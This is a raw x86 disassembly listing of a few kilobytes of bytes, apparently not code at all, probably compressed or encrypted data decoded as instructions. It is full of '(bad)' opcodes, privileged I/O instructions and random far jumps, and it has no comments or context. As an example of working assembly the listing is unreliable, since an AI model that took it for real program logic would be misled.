  41f6c8:	cli    
  41f6c9:	in     eax,dx
  41f6ca:	popf   
  41f6cb:	jmp    0x4ffded04
  41f6d0:	sub    ebx,edx
  41f6d2:	int    0x5c
  41f6d4:	xchg   ebp,eax
  41f6d5:	jmp    0x9002:0xc20de6a4
  41f6dc:	mov    ah,0x5e
  41f6de:	pop    eax
  41f6df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6e0:	or     BYTE PTR [ecx+0x60],bl
  41f6e3:	mov    dh,0xdb
  41f6e5:	lods   al,BYTE PTR ds:[esi]
  41f6e6:	scas   eax,DWORD PTR es:[edi]
  41f6e7:	hlt    
  41f6e8:	sbb    al,0xa1
  41f6ea:	push   cs
  41f6eb:	cdq    
  41f6ec:	and    ch,BYTE PTR ds:0x4f05
  41f6f1:	retf   
  41f6f2:	dec    ecx
  41f6f3:	mov    es,WORD PTR [eax]
  41f6f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6f6:	xor    eax,0xb5e94fab
  41f6fb:	pusha  
  41f6fc:	push   ebp
  41f6fd:	outs   dx,DWORD PTR ds:[esi]
  41f6fe:	ins    BYTE PTR es:[edi],dx
  41f6ff:	inc    ebp
  41f700:	repz xchg ebp,eax
  41f702:	mov    ecx,0x6276d57d
  41f707:	dec    edx
  41f708:	xchg   esp,eax
  41f709:	icebp  
  41f70a:	or     bh,BYTE PTR [edi-0x10521751]
  41f710:	add    al,0xf0
  41f712:	pushf  
  41f713:	push   ss
  41f714:	sti    
  41f715:	and    esp,eax
  41f717:	fidivr DWORD PTR [edx-0x703e1444]
  41f71d:	push   0xfffffff1
  41f71f:	jo     0x41f708
  41f721:	inc    esp
  41f722:	xchg   BYTE PTR [edi],bh
  41f724:	xor    al,0xab
  41f726:	scas   eax,DWORD PTR es:[edi]
  41f727:	mov    cl,0x3f
  41f729:	sub    ebx,DWORD PTR [ebx-0xe]
  41f72c:	lahf   
  41f72d:	fwait
  41f72e:	mov    eax,ds:0xe3d12b0a
  41f733:	lock xor al,0x1c
  41f736:	and    eax,0x6e803886
  41f73b:	push   ds
  41f73c:	stos   BYTE PTR es:[edi],al
  41f73d:	xchg   ch,cl
  41f73f:	cmp    al,0xc7
  41f741:	and    dh,BYTE PTR [edi]
  41f743:	popf   
  41f744:	mov    eax,ds:0xb5eac37b
  41f749:	push   esi
  41f74a:	add    eax,0x5f9bfa7f
  41f74f:	ret    
  41f750:	or     ebx,DWORD PTR ds:0x58149927
  41f756:	lahf   
  41f757:	out    0xd1,al
  41f759:	xchg   BYTE PTR [edx+ebx*8+0x17],al
  41f75d:	popf   
  41f75e:	sub    DWORD PTR gs:[esi+0x2144f08f],edi
  41f765:	addr16 ja 0x41f6e8
  41f768:	jne    0x41f70f
  41f76a:	xor    al,0xf1
  41f76c:	pop    esi
  41f76d:	ret    0xd50b
  41f770:	add    esi,DWORD PTR [esi-0x16]
  41f773:	sbb    al,0xde
  41f775:	add    bh,bh
  41f777:	add    ah,BYTE PTR [esi-0x3cca002]
  41f77d:	scas   eax,DWORD PTR es:[edi]
  41f77e:	mov    al,0xc1
  41f780:	rcl    DWORD PTR [edi],1
  41f782:	add    BYTE PTR [eax],bh
  41f784:	(bad)  
  41f785:	push   es
  41f786:	lea    esi,[edi-0x105f85cb]
  41f78c:	lahf   
  41f78d:	dec    esi
  41f78e:	and    BYTE PTR [eax+edx*4-0x71bd3298],ch
  41f795:	out    0xd6,eax
  41f797:	in     eax,0x57
  41f799:	inc    eax
  41f79a:	push   ds
  41f79b:	jne    0x41f783
  41f79d:	add    DWORD PTR [eax+0x77d57eb7],edi
  41f7a3:	iret   
  41f7a4:	and    al,0xc7
  41f7a6:	sub    eax,0xdfa07101
  41f7ab:	adc    ch,BYTE PTR [esi]
  41f7ad:	sbb    BYTE PTR [ebx+0x5a],ah
  41f7b0:	lahf   
  41f7b1:	fdivr  st(1),st
  41f7b3:	pusha  
  41f7b4:	adc    eax,0xedf9525e
  41f7b9:	test   DWORD PTR [ebx-0x39c38cfd],0x31afe126
  41f7c3:	ret    
  41f7c4:	js     0x41f81a
  41f7c6:	sbb    BYTE PTR [ebx-0x6edbfd52],bl
  41f7cc:	sahf   
  41f7cd:	jecxz  0x41f814
  41f7cf:	jnp    0x41f76c
  41f7d1:	push   es
  41f7d2:	jbe    0x41f7fe
  41f7d4:	mov    BYTE PTR [esi+esi*4+0x59f1ea06],cl
  41f7db:	cld    
  41f7dc:	loop   0x41f7e6
  41f7de:	mov    esi,0xdd86a71e
  41f7e3:	pop    ebp
  41f7e4:	add    bl,BYTE PTR [ebx]
  41f7e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7e7:	or     ecx,esp
  41f7e9:	loop   0x41f79a
  41f7eb:	or     ch,BYTE PTR [edx+0x8]
  41f7ee:	retf   0x206e
  41f7f1:	jp     0x41f7dd
  41f7f3:	mov    ah,BYTE PTR [ebx+0x10]
  41f7f6:	pop    ebx
  41f7f7:	repz adc ebx,ebp
  41f7fa:	xchg   ebp,eax
  41f7fb:	and    eax,0xfa629bc5
  41f800:	pop    edi
  41f801:	mul    ebp
  41f803:	retf   0x65fa
  41f806:	sar    BYTE PTR [ecx-0x10],0x77
  41f80a:	mov    esi,DWORD PTR [ebx]
  41f80c:	add    BYTE PTR [ecx],dl
  41f80e:	scas   al,BYTE PTR es:[edi]
  41f80f:	add    eax,0x43d680ce
  41f814:	or     al,0x43
  41f816:	cmp    BYTE PTR [esi-0x58],dl
  41f819:	fwait
  41f81a:	mov    ds:0xa47e1e1f,al
  41f81f:	ins    DWORD PTR es:[edi],dx
  41f820:	jg     0x41f7fc
  41f822:	mov    ebx,0x392ec089
  41f827:	cli    
  41f828:	sbb    esi,edi
  41f82a:	aas    
  41f82b:	out    dx,al
  41f82c:	sbb    DWORD PTR [edi+0x5e5b2f49],edx
  41f832:	push   edx
  41f833:	aas    
  41f834:	shr    BYTE PTR ds:[ebp-0x27],1
  41f838:	xor    dh,dl
  41f83a:	aaa    
  41f83b:	loope  0x41f865
  41f83d:	in     eax,dx
  41f83e:	daa    
  41f83f:	mov    BYTE PTR ds:0x42d2fd0f,dl
  41f845:	fidivr WORD PTR [esi+0x2a]
  41f848:	push   edx
  41f849:	jo     0x41f805
  41f84b:	pushf  
  41f84c:	add    al,0xa8
  41f84e:	scas   eax,DWORD PTR es:[edi]
  41f84f:	jge    0x41f8bc
  41f851:	xchg   ebx,eax
  41f852:	shl    BYTE PTR [esi],0x85
  41f855:	mov    ds:0xc6821b39,eax
  41f85a:	push   ebx
  41f85b:	mov    al,ds:0xaf224180
  41f860:	fldcw  WORD PTR ds:0xcf18ad94
  41f866:	test   al,0x2c
  41f868:	push   es
  41f869:	in     eax,0xcd
  41f86b:	xlat   BYTE PTR ds:[ebx]
  41f86c:	pop    ds
  41f86d:	add    al,BYTE PTR [esi-0xb]
  41f870:	xchg   ebp,eax
  41f871:	dec    edx
  41f872:	clc    
  41f873:	repz and al,0xc1
  41f876:	div    ebp
  41f878:	jmp    0x91c6:0x746f2ee1
  41f87f:	and    BYTE PTR [edi+ebp*4-0x61a28e64],bl
  41f886:	scas   eax,DWORD PTR es:[edi]
  41f887:	stos   DWORD PTR es:[edi],eax
  41f888:	jae    0x41f836
  41f88a:	mov    BYTE PTR [eax+edi*8],bh
  41f88d:	sbb    DWORD PTR [eax],esp
  41f88f:	fistp  QWORD PTR [eax]
  41f891:	mov    ds:0xe6cb93c,al
  41f896:	fmul   DWORD PTR [eax]
  41f898:	cdq    
  41f899:	add    eax,0x70f074eb
  41f89e:	lods   al,BYTE PTR ds:[esi]
  41f89f:	les    ebp,FWORD PTR [ecx+0x10]
  41f8a2:	cli    
  41f8a3:	inc    edx
  41f8a4:	pop    ss
  41f8a5:	popf   
  41f8a6:	rcl    ebx,1
  41f8a8:	mov    dh,0xef
  41f8aa:	add    dh,BYTE PTR [edx+0x60]
  41f8ad:	xor    al,0x21
  41f8af:	jl     0x41f8e5
  41f8b1:	pop    eax
  41f8b2:	imul   edx,ebp,0x1d0f54df
  41f8b8:	push   ds
  41f8b9:	push   eax
  41f8bb:	pushf  
  41f8bc:	sub    cl,dh
  41f8be:	xchg   edx,eax
  41f8bf:	ja     0x41f913
  41f8c1:	in     eax,dx
  41f8c2:	stos   DWORD PTR es:[edi],eax
  41f8c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8c5:	repz loop 0x41f885
  41f8c8:	mov    eax,ds:0xd76d7e80
  41f8cd:	jmp    0x1b61ea1b
  41f8d2:	push   esi
  41f8d3:	stc    
  41f8d4:	xor    BYTE PTR [edx+0x5f],0xa
  41f8d8:	pushf  
  41f8d9:	cld    
  41f8da:	push   0x2a194954
  41f8df:	and    al,0x88
  41f8e1:	repz pop edx
  41f8e3:	mov    al,ds:0xa4affcb
  41f8e8:	jecxz  0x41f88b
  41f8ea:	sub    ah,BYTE PTR [edi+0x569a5761]
  41f8f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8f1:	and    al,ah
  41f8f3:	cmp    DWORD PTR [ebx+0x5a],edx
  41f8f6:	cs rcr ecx,0x83
  41f8fa:	hlt    
  41f8fb:	jnp    0x41f8a1
  41f8fd:	outs   dx,DWORD PTR ds:[esi]
  41f8fe:	pop    edi
  41f8ff:	push   ds
  41f900:	adc    ebp,DWORD PTR [edi]
  41f902:	add    eax,0xeab428c9
  41f907:	pop    es
  41f908:	xor    al,0xb2
  41f90a:	stos   BYTE PTR es:[edi],al
  41f90b:	stc    
  41f90c:	popf   
  41f90d:	xchg   edi,eax
  41f90e:	mov    eax,0x8b85ea72
  41f913:	adc    esp,DWORD PTR [ebx+0x5c]
  41f916:	mov    dl,0x18
  41f918:	fnsave [eax]
  41f91a:	mov    esi,0xfec3997f
  41f91f:	sub    esp,DWORD PTR [eax]
  41f921:	inc    ecx
  41f922:	push   0x9b91821c
  41f927:	or     BYTE PTR [ecx-0x2d],ch
  41f92a:	fwait
  41f92b:	int3   
  41f92c:	repz jnp 0x41f8ff
  41f92f:	cwde   
  41f930:	mov    al,0x57
  41f932:	adc    DWORD PTR [esi-0x54f246be],edi
  41f938:	xlat   BYTE PTR ds:[ebx]
  41f939:	mov    esi,esp
  41f93b:	and    ah,BYTE PTR [ebp+0x46]
  41f93e:	and    cl,ah
  41f940:	int    0xb2
  41f942:	mov    al,0xcc
  41f944:	test   DWORD PTR [ebp-0x20bce504],ebp
  41f94a:	adc    ah,BYTE PTR [ebp-0x1ea34456]
  41f950:	int3   
  41f951:	xchg   esp,eax
  41f952:	or     ah,BYTE PTR [esi]
  41f954:	push   ss
  41f955:	pop    ebx
  41f956:	fcmovnb st,st(0)
  41f958:	xor    esi,edx
  41f95a:	(bad)  
  41f95b:	push   esp
  41f95c:	push   ecx
  41f95d:	add    DWORD PTR [ebx-0x15696565],0x292638d
  41f967:	call   0x6f9d36c1
  41f96c:	les    edx,FWORD PTR [ebx+eax*2-0x2c59299e]
  41f973:	lock js 0x41f973
  41f976:	pop    eax
  41f977:	ja     0x41f94e
  41f979:	out    0xb1,eax
  41f97b:	loope  0x41f9d3
  41f97d:	or     BYTE PTR [ebx+0x64],ch
  41f980:	test   BYTE PTR [ecx+0x6],dl
  41f983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f984:	xchg   ebp,eax
  41f985:	sbb    BYTE PTR [eax-0x70],ah
  41f988:	test   BYTE PTR ds:0xc5249619,dh
  41f98e:	and    ebp,eax
  41f990:	and    al,0x26
  41f992:	aas    
  41f993:	(bad)  
  41f995:	xchg   edx,eax
  41f996:	jmp    0x41f9b8
  41f998:	xchg   esi,eax
  41f999:	js     0x41f952
  41f99b:	xor    bl,BYTE PTR [ebx-0x6]
  41f99e:	in     eax,dx
  41f99f:	inc    BYTE PTR [ebx+edx*4+0x2b7fa35a]
  41f9a6:	je     0x41f9c5
  41f9a8:	hlt    
  41f9a9:	dec    ebp
  41f9aa:	nop
  41f9ab:	cld    
  41f9ac:	pop    ecx
  41f9ad:	sete   BYTE PTR [ecx-0x5f5b4976]
  41f9b4:	add    DWORD PTR [ebp-0x3a80fa6d],esp
  41f9ba:	out    dx,al
  41f9bb:	aas    
  41f9bc:	(bad)  
  41f9be:	sub    dh,ah
  41f9c0:	cmp    ah,BYTE PTR cs:[esi]
  41f9c3:	stc    
  41f9c4:	dec    ebp
  41f9c5:	repnz xchg ebp,eax
  41f9c7:	inc    edi
  41f9c8:	push   ebp
  41f9c9:	ins    BYTE PTR es:[edi],dx
  41f9ca:	cmp    DWORD PTR [ecx],edx
  41f9cc:	sub    DWORD PTR [ebx],ebp
  41f9ce:	out    dx,al
  41f9cf:	xor    al,0xd8
  41f9d1:	add    eax,0x6d5b8c21
  41f9d6:	(bad)  
  41f9d8:	mov    eax,ds:0x5f43ffa0
  41f9dd:	daa    
  41f9de:	stc    
  41f9df:	and    BYTE PTR [ebp-0x67],al
  41f9e2:	clc    
  41f9e3:	repnz sbb DWORD PTR [ebp-0x7b34c6a8],ebx
  41f9ea:	cmp    ebp,eax
  41f9ec:	add    bh,BYTE PTR [ecx+0x7299561f]
  41f9f2:	pusha  
  41f9f3:	push   0x36705b90
  41f9f8:	mov    ds:0x69f657b5,eax
  41f9fd:	sbb    DWORD PTR [ebx],eax
  41f9ff:	gs inc esp
  41fa01:	inc    ebp
  41fa02:	mov    ah,0x70
  41fa04:	pop    eax
  41fa05:	mov    al,0xaa
  41fa07:	pop    eax
  41fa08:	dec    ebp
  41fa09:	jo     0x41f9cd
  41fa0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa0c:	jmp    0x41f9ba
  41fa0e:	cs push es
  41fa10:	mov    bh,0x2
  41fa12:	and    bl,BYTE PTR [ecx]
  41fa14:	xor    ebx,edi
  41fa16:	(bad)  
  41fa17:	aam    0xf6
  41fa19:	mov    ds,WORD PTR [ecx]
  41fa1b:	or     BYTE PTR [ebx],0x8a
  41fa1e:	sub    ah,BYTE PTR [edx]
  41fa20:	loope  0x41fa6f
  41fa22:	into   
  41fa23:	and    DWORD PTR [edi+ebp*4-0x55],0x56
  41fa28:	cld    
  41fa29:	out    dx,eax
  41fa2a:	(bad)  
  41fa2b:	sub    al,0x9e
  41fa2d:	in     al,0x3a
  41fa2f:	mov    ds:0xce5cdce4,al
  41fa34:	xor    BYTE PTR [ecx],0xb7
  41fa37:	outs   dx,BYTE PTR ds:[esi]
  41fa38:	loopne 0x41fa33
  41fa3a:	fldcw  WORD PTR [esi]
  41fa3c:	add    ebp,edi
  41fa3e:	lahf   
  41fa3f:	xor    BYTE PTR [ebx],0x45
  41fa42:	inc    ebp
  41fa43:	or     DWORD PTR [edx],eax
  41fa45:	bound  esi,QWORD PTR [ebp-0x21ff3d4f]
  41fa4b:	fcomp  DWORD PTR [eax+0x26db6506]
  41fa51:	xor    esp,0x43da4848
  41fa57:	pop    es
  41fa58:	mov    ds:0xd1f94c4b,al
  41fa5d:	adc    esi,ecx
  41fa5f:	popf   
  41fa60:	sbb    DWORD PTR [edx-0x7f2b922b],ebx
  41fa66:	mov    esp,0xcd3acd7b
  41fa6b:	sub    eax,0x760a19dc
  41fa70:	daa    
  41fa71:	les    ebp,FWORD PTR [edi-0x73fbef83]
  41fa77:	inc    edx
  41fa78:	pop    ds
  41fa79:	pushf  
  41fa7a:	add    eax,0xd058e883
  41fa7f:	push   edi
  41fa80:	loope  0x41fae1
  41fa82:	int    0xc3
  41fa84:	retf   0x9518
  41fa87:	or     dl,dl
  41fa89:	(bad)  
  41fa8a:	cmp    DWORD PTR [ecx],edi
  41fa8c:	sub    ch,BYTE PTR [edx-0x1236efe]
  41fa92:	xor    eax,0xe630e0db
  41fa97:	jbe    0x41fad1
  41fa99:	ins    DWORD PTR es:[edi],dx
  41fa9a:	mov    esp,0x6ef0e21f
  41fa9f:	mov    al,ds:0x53d121ff
  41faa4:	in     al,dx
  41faa5:	loop   0x41faba
  41faa7:	mov    eax,0x2a5bc156
  41faac:	mov    ebp,0xf81499e8
  41fab1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fab2:	push   cs
  41fab3:	pop    es
  41fab4:	loope  0x41fa77
  41fab6:	jbe    0x41fa5b
  41fab8:	jecxz  0x41fb21
  41faba:	retf   
  41fabb:	xchg   edx,eax
  41fabc:	nop
  41fabd:	sahf   
  41fabe:	push   eax
  41fabf:	adc    ah,al
  41fac1:	sti    
  41fac2:	mov    eax,0xc279370a
  41fac7:	cmp    eax,DWORD PTR [ebp+ebp*2-0x6a1c63f1]
  41face:	pop    ds
  41facf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fad0:	xchg   ecx,eax
  41fad1:	sahf   
  41fad2:	xchg   ecx,eax
  41fad3:	push   ds
  41fad4:	pop    esp
  41fad5:	mov    ah,0xa
  41fad7:	rcr    DWORD PTR [eax+0x40],1
  41fada:	sub    eax,0xc55e785
  41fadf:	pause  
  41fae1:	lods   eax,DWORD PTR ds:[esi]
  41fae2:	adc    eax,0xc4d0f0f0
  41fae7:	mov    ds:0xcc2830b1,eax
  41faec:	push   esp
  41faed:	inc    esp
  41faee:	mov    bh,0xe
  41faf0:	ror    BYTE PTR [eax],cl
  41faf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41faf3:	pop    ds
  41faf4:	add    BYTE PTR [eax+0x6925a015],0x58
  41fafb:	(bad)  
  41fafc:	(bad)  
  41fafd:	mov    cl,0xa9
  41faff:	cmp    esp,esi
  41fb01:	loopne 0x41fb1e
  41fb03:	test   BYTE PTR [ebx+edi*8-0x7a],0x19
  41fb08:	out    0x17,eax
  41fb0a:	fwait
  41fb0b:	sbb    esi,esp
  41fb0d:	jo     0x41faf7
  41fb0f:	mov    esi,0xe4eac02b
  41fb14:	retf   
  41fb15:	jecxz  0x41fb09
  41fb17:	pop    eax
  41fb18:	mov    bl,0xde
  41fb1a:	mov    eax,ds:0x67ab0b18
  41fb1f:	sbb    esp,DWORD PTR [eax]
  41fb21:	pop    ds
  41fb22:	or     dh,BYTE PTR [ecx-0x541814f3]
  41fb28:	xor    ebp,DWORD PTR [ebx]
  41fb2a:	cmp    al,0x7
  41fb2c:	jae    0x41fb81
  41fb2e:	pusha  
  41fb2f:	jmp    0x41faca
  41fb31:	inc    edx
  41fb32:	jg     0x41faf4
  41fb34:	jo     0x41fac5
  41fb36:	popa   
  41fb37:	dec    ebp
  41fb38:	mov    bh,0x43
  41fb3a:	js     0x41fb60
  41fb3c:	pop    ebx
  41fb3d:	dec    esp
  41fb3e:	shl    eax,cl
  41fb40:	cmc    
  41fb41:	sbb    BYTE PTR [ebx],dl
  41fb43:	add    eax,0x2894672b
  41fb48:	je     0x41fb5d
  41fb4a:	mov    bl,0x85
  41fb4c:	pushf  
  41fb4d:	cmp    BYTE PTR [eax],bh
  41fb4f:	mov    ch,0xb1
  41fb51:	mov    DWORD PTR [ebx],ebx
  41fb53:	rol    BYTE PTR [ecx],1
  41fb55:	pop    bp
  41fb57:	jb     0x41fbd6
  41fb59:	mov    WORD PTR [eax-0x6cf6fa75],fs
  41fb5f:	adc    BYTE PTR [esp-0x57],cl
  41fb63:	mov    ah,bl
  41fb65:	cs sahf 
  41fb67:	inc    eax
  41fb68:	std    
  41fb69:	(bad)  
  41fb6a:	or     eax,0x5eed56d0
  41fb6f:	inc    ebp
  41fb70:	sub    edi,DWORD PTR [edx-0x1ed55141]
  41fb76:	xchg   ebp,eax
  41fb77:	pop    edi
  41fb78:	push   0xffffffab
  41fb7a:	xor    BYTE PTR [edi],dh
  41fb7c:	push   ds
  41fb7d:	inc    eax
  41fb7e:	dec    esi
  41fb7f:	inc    esi
  41fb80:	aaa    
  41fb81:	cmp    bh,BYTE PTR [edi+0x4f]
  41fb84:	sbb    al,0xa5
  41fb86:	sub    al,0xc8
  41fb88:	repnz rcl ebx,1
  41fb8b:	jns    0x41fbde
  41fb8d:	jb     0x41fb71
  41fb8f:	mov    al,ds:0x1a15c851
  41fb94:	sub    al,ch
  41fb96:	rcl    BYTE PTR [edi],0x91
  41fb99:	arpl   WORD PTR [edi+0x505bb730],ax
  41fb9f:	dec    edx
  41fba0:	pop    edx
  41fba1:	call   FWORD PTR [ebp+0x24]
  41fba4:	fild   QWORD PTR [ebx]
  41fba6:	(bad)  
  41fba7:	adc    DWORD PTR [esi],esp
  41fba9:	inc    eax
  41fbaa:	test   eax,0xec9b2662
  41fbaf:	mov    edx,0xba1b5e32
  41fbb4:	pushf  
  41fbb5:	mov    bh,BYTE PTR [eax+0x41]
  41fbb8:	mov    edx,0x3015b96d
  41fbbd:	jnp    0x41fbda
  41fbbf:	pop    ecx
  41fbc0:	pop    eax
  41fbc1:	test   al,0xfb
  41fbc3:	pop    es
  41fbc4:	out    0x1f,eax
  41fbc6:	loop   0x41fba6
  41fbc8:	ja     0x41fbeb
  41fbca:	add    edi,DWORD PTR [eax+edx*8]
  41fbcd:	and    al,0xd5
  41fbcf:	push   edi
  41fbd0:	push   ds
  41fbd1:	shl    dh,cl
  41fbd3:	push   ecx
  41fbd4:	pushf  
  41fbd5:	les    eax,FWORD PTR [ebx]
  41fbd7:	ja     0x41fb97
  41fbd9:	push   ebp
  41fbda:	jmp    0x2a7e:0x2ce524de
  41fbe1:	xchg   ecx,eax
  41fbe2:	cmp    edi,esi
  41fbe4:	dec    edi
  41fbe5:	dec    eax
  41fbe6:	sub    esi,edi
  41fbe8:	xor    bl,BYTE PTR [edi-0x2c]
  41fbeb:	mov    cl,0x96
  41fbed:	pop    edi
  41fbee:	cmc    
  41fbef:	xchg   esp,eax
  41fbf0:	scas   eax,DWORD PTR es:[edi]
  41fbf1:	(bad)  
  41fbf2:	mov    edx,0xd79300ac
  41fbf7:	icebp  
  41fbf8:	and    bh,BYTE PTR fs:[ebp+0x46475582]
  41fbff:	sti    
  41fc00:	or     al,0x23
  41fc02:	test   al,0xe8
  41fc04:	sub    eax,0xa8307dcb
  41fc09:	leave  
  41fc0a:	fwait
  41fc0b:	sub    eax,0x7bed6988
  41fc10:	(bad)  
  41fc11:	ret    0x4ced
  41fc14:	pop    ecx
  41fc15:	shl    DWORD PTR ds:0xf4d1d9fd,cl
  41fc1b:	aad    0xee
  41fc1d:	stc    
  41fc1e:	shr    DWORD PTR [ebx],cl
  41fc20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc21:	pushf  
  41fc22:	sub    BYTE PTR [ebp-0x1555b6e2],bl
  41fc28:	jl     0x41fc3d
  41fc2a:	out    dx,eax
  41fc2b:	mov    cl,0xb6
  41fc2d:	sbb    edi,ecx
  41fc2f:	aad    0x6f
  41fc31:	imul   ebx,DWORD PTR [ecx],0xc5654b21
  41fc37:	mov    al,0xe4
  41fc39:	sbb    DWORD PTR [esi+edx*4],esi
  41fc3c:	jae    0x41fc27
  41fc3e:	clc    
  41fc3f:	and    al,0x1f
  41fc41:	das    
  41fc42:	dec    ebp
  41fc43:	and    BYTE PTR [esi+0x42f7cd7],0xb1
  41fc4a:	rol    BYTE PTR ds:0xdbc098b1,cl
  41fc50:	jl     0x41fc6e
  41fc52:	adc    esi,DWORD PTR [esi]
  41fc54:	shl    BYTE PTR [ecx-0x61dc1618],cl
  41fc5a:	xchg   edi,eax
  41fc5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc5c:	and    bl,BYTE PTR [eax]
  41fc5e:	popf   
  41fc5f:	arpl   WORD PTR [edx+0x65611f32],di
  41fc65:	pop    edi
  41fc66:	test   DWORD PTR [ebp+0x2b],ebx
  41fc69:	cdq    
  41fc6a:	loopne 0x41fc88
  41fc6c:	pop    ss
  41fc6d:	sar    bl,cl
  41fc6f:	dec    edi
  41fc70:	shr    DWORD PTR [esi],cl
  41fc72:	pop    esp
  41fc73:	mov    cs,WORD PTR [edi-0x5d]
  41fc76:	rcr    edx,0xd3
  41fc79:	dec    esp
  41fc7a:	shl    BYTE PTR [ecx+0x69a51fba],1
  41fc80:	das    
  41fc81:	push   ds
  41fc82:	sbb    DWORD PTR [ecx-0x5c86053b],ecx
  41fc88:	mov    al,0x4d
  41fc8a:	inc    eax
  41fc8b:	jae    0x41fc14
  41fc8d:	sbb    ebp,DWORD PTR [esi-0x5d]
  41fc90:	inc    eax
  41fc91:	sub    dl,BYTE PTR [esp+eax*1+0x30]
  41fc95:	aaa    
  41fc96:	mov    al,ds:0x25a624b3
  41fc9b:	js     0x41fcc7
  41fc9d:	adc    DWORD PTR [edx-0x6f],eax
  41fca0:	adc    bl,BYTE PTR [edi]
  41fca2:	or     al,BYTE PTR [edi-0x13]
  41fca5:	out    0x9,eax
  41fca7:	sbb    al,0x78
  41fcaa:	dec    esi
  41fcab:	sbb    eax,0x2d6fc88a
  41fcb0:	daa    
  41fcb1:	xchg   ebx,eax
  41fcb2:	mov    eax,DWORD PTR [edx-0x5d50d6af]
  41fcb8:	mov    eax,ds:0xbf6f6719
  41fcbd:	mov    edi,0xff615fe1
  41fcc2:	leave  
  41fcc3:	xor    al,0xcf
  41fcc5:	loopne 0x41fc77
  41fcc7:	sub    ch,cl
  41fcc9:	lods   al,BYTE PTR ds:[esi]
  41fcca:	dec    edi
  41fccb:	(bad)  
  41fccc:	hlt    
  41fccd:	jp     0x41fd37
  41fccf:	loopne 0x41fcfd
  41fcd1:	cmp    BYTE PTR gs:0x82f278c9,bl
  41fcd8:	dec    esp
  41fcd9:	aad    0x94
  41fcdb:	inc    ebx
  41fcdc:	push   ss
  41fcdd:	push   edx
  41fcde:	inc    ebp
  41fcdf:	pop    ss
  41fce0:	icebp  
  41fce1:	mov    ds:0x76c8ceda,al
  41fce6:	in     al,0x62
  41fce8:	lds    esp,FWORD PTR ds:[edx-0x3b]
  41fcec:	jmp    0x1c84563
  41fcf1:	imul   esi,DWORD PTR [edx+esi*2+0x1c713928],0xf653a6fa
  41fcfc:	dec    esp
  41fcfd:	push   edx
  41fcfe:	cld    
  41fcff:	push   eax
  41fd00:	dec    edx
  41fd01:	adc    DWORD PTR [ebx],esi
  41fd03:	add    al,0xa3
  41fd05:	repz add esp,edx
  41fd08:	(bad)  
  41fd0a:	clc    
  41fd0b:	scas   eax,DWORD PTR es:[edi]
  41fd0c:	push   eax
  41fd0d:	adc    eax,0x5bf1e6ea
  41fd12:	and    bl,BYTE PTR [ecx]
  41fd14:	mov    DWORD PTR ds:0x989a941c,esp
  41fd1a:	pop    ss
  41fd1b:	xchg   ch,dh
  41fd1d:	ficom  DWORD PTR cs:[edi]
  41fd20:	dec    eax
  41fd21:	mov    al,ds:0xbd30fad1
  41fd26:	jne    0x41fccf
  41fd28:	jmp    0x41fd1b
  41fd2a:	push   edx
  41fd2b:	mul    BYTE PTR [edx]
  41fd2d:	jno    0x41fcc6
  41fd2f:	hlt    
  41fd30:	sbb    al,ah
  41fd32:	loopne 0x41fda4
  41fd34:	js     0x41fcb7
  41fd36:	(bad)  
  41fd37:	push   edx
  41fd38:	sbb    al,0x79
  41fd3a:	push   esp
  41fd3b:	fadd   st,st(6)
  41fd3d:	into   
  41fd3e:	or     BYTE PTR [edx+0x4c9f5bee],bh
  41fd44:	ins    DWORD PTR es:[edi],dx
  41fd45:	pop    ebx
  41fd46:	in     al,0x67
  41fd48:	jns    0x41fd12
  41fd4a:	call   0xeee2:0x9af5b303
  41fd51:	mov    cl,0xcf
  41fd53:	inc    esp
  41fd54:	pusha  
  41fd55:	inc    ebx
  41fd56:	leave  
  41fd57:	pop    ebx
  41fd58:	dec    edx
  41fd59:	mov    eax,ds:0xf6e29ef2
  41fd5e:	add    eax,ebp
  41fd60:	sti    
  41fd61:	mov    esp,0xbaa598d
  41fd66:	pop    ds
  41fd67:	shr    BYTE PTR [ebx],0x94
  41fd6a:	fisttp WORD PTR [eax-0x4a]
  41fd6d:	jg     0x41fdde
  41fd6f:	sar    BYTE PTR [esi+0x46a05344],0xa0
  41fd76:	mov    al,ds:0x4d5a562a
  41fd7b:	push   0x32
  41fd7d:	dec    ecx
  41fd7e:	stos   DWORD PTR es:[edi],eax
  41fd7f:	mov    fs,edx
  41fd81:	rol    al,cl
  41fd83:	ins    BYTE PTR es:[edi],dx
  41fd84:	pop    ss
  41fd85:	jp     0x41fde5
  41fd87:	ror    DWORD PTR [edx+0x71],0xe9
  41fd8b:	lahf   
  41fd8c:	scas   al,BYTE PTR es:[edi]
  41fd8d:	aad    0xc3
  41fd8f:	xor    dh,BYTE PTR [esi+0x24391068]
  41fd95:	jb     0x41fd3e
  41fd97:	inc    edi
  41fd98:	and    ebx,esp
  41fd9a:	push   0x9178b05
  41fd9f:	adc    eax,0x72d4ae40
  41fda4:	sub    edx,DWORD PTR [esi+eax*2+0x1bf89908]
  41fdab:	xor    al,0x3a
  41fdad:	fdivr  DWORD PTR [esi-0x6ee013b7]
  41fdb3:	push   0xd8118a8b
  41fdb8:	fild   QWORD PTR [edx+0x33]
  41fdbb:	push   ds
  41fdbc:	jp     0x41fe20
  41fdbe:	sub    al,0xef
  41fdc0:	mov    edi,0xaead418
  41fdc5:	or     eax,0x8c6f0dcc
  41fdca:	push   cs
  41fdcb:	mov    bl,0xe6
  41fdcd:	call   0x331f33dd
  41fdd2:	adc    BYTE PTR [edx],0x22
  41fdd5:	lods   eax,DWORD PTR ds:[esi]
  41fdd6:	mov    bh,cl
  41fdd8:	sbb    BYTE PTR [esi-0x6e05f74],bh
  41fdde:	mov    eax,0xa10ee72a
  41fde3:	loopne 0x41fd79
  41fde5:	inc    eax
  41fde6:	xchg   edi,eax
  41fde7:	(bad)  
  41fde9:	fisttp WORD PTR [edx+0x5180e142]
